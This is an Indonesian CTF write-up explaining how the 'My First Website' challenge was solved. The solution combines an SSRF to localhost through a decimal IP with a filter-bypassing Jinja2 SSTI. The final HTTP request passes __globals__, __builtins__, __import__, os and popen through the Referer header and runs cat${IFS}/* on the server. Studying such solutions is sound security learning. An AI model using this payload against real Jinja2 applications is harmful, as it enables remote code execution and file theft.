# My First Website

Description:
```
Good Luck

Link: xxx
Author: daffainfo
```
### Cara Solve

* SSTI dengan menggunakan bilangan desimal (Untuk referensi bisa dibaca [disini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-a-decimal-ip-location))

* Kemudian diikuti dengan SSTI yang memiliki filter sangat banyak. Jika melihat dokumentasi Jinja2, kita bisa membypass filter-filter tersebut menggunakan `request.referrer`

## Final payload:
```
GET /?url=@2130706433:1337/environment?admin={%print(request|attr(request.referrer.split().pop(0))|attr(request.referrer.split().pop(1))|attr(request.referrer.split().pop(2))(request.referrer.split().pop(3))|attr(request.referrer.split().pop(2))(request.referrer.split().pop(4))(request.referrer.split().pop(5))|attr(request.referrer.split().pop(6))(request.referrer.split().pop(7))|attr(request.referrer.split().pop(8)))()%}%23/about/ HTTP/1.1
Host: example
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cache-Control: max-age=0
Referer: application __globals__ __getitem__ __builtins__ __import__ os popen cat${IFS}/* read
```